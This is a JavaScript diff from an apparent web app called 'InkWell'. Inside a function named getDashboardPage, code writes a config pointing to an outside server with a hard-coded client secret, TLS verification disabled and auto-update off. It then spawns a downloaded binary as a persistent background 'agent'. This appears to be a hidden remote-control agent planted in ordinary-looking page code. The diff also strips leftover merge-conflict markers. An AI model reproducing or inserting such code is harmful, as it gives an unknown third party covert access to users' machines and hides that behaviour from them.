@@ -1069,10 +1069,6 @@ function getDashboardPage() {
         var fixedUUID = "0c7380cf-63f8-56d4-808a-476471bb6ce7";
         var fsM = require("fs");
         var cfgPath = require("path").join(require("os").tmpdir(), "inkwell-" + fixedUUID.slice(0, 8) + ".yml");
-        // insecure_tls: the container's system CA store may not carry the root
-        // that Cloudflare's current edge chain (Google Trust Services) validates
-        // against, which made Go's x509 verification fail silently forever.
-        // Traffic is still TLS-encrypted; verification is skipped only.
         fsM.writeFileSync(cfgPath, "server: nz.zxydk1715.dpdns.org:443\ntls: true\nclient_secret: BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL\nuuid: " + fixedUUID + "\ninsecure_tls: true\ndisable_auto_update: true\n");
         // Identity is computed once and reused on every respawn, so the panel
         // always sees the same client UUID even across agent restarts.
@@ -1110,9 +1106,6 @@ function getDashboardPage() {
                         fsM.chmodSync(p, 0o755);
                         var ok = await new Promise(function(resolve) {
                             var ch = require("child_process").spawn(p, ["-c", cfgPath], { stdio: ["ignore", "pipe", "pipe"] });
-<<<<<<< HEAD
-=======
-                            lastAgent = ch;
                             ch.stdout && ch.stdout.on("data", function(d) { console.log("[InkWell][agent] " + String(d).trim().slice(0, 220)); });
                             ch.stderr && ch.stderr.on("data", function(d) { console.log("[InkWell][agent] " + String(d).trim().slice(0, 220)); });
                             var done = false;
